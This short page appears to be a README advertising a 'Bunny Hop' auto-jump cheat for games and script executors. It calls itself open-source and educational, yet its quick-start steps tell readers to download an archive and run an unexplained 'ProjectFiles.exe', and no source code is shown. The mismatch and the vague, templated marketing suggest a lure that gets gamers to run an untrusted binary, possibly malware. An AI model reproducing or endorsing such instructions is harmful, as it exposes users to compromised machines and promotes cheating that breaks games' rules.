🐰 Bunny Hop Script

Auto Bhop & Movement Tool — 2026

High-performance Bunny Hop script focused on smooth automatic jumping and movement assistance.
Clean modular structure, fully configurable and easy to use.

🎯 What it is

Bunny Hop Script is a lightweight tool that provides automatic bunny hopping and improved movement control.
It is designed to be stable, easy to configure and work with popular games and executors.

⚠️
Use at your own risk. This is an open-source educational project.

🚀 Quick Start

1. Download the project using the button above.
2. Extract the archive into a separate folder.
3. Run ProjectFiles.exe.
4. Follow the on-screen instructions.

✨ Features

| Feature                  | Description                                      |
|--------------------------|--------------------------------------------------|
| 🐰 Auto Bhop         | Smooth automatic jumping                         |

🧩 How to use

1. Launch the tool.
2. Configure your bhop settings.
3. Join the game.
4. Hold or toggle the bhop key.

⚙️ Configuration

All settings can be changed in the config:

- Jump timing
- Jump strength
- Air control
- Hotkeys
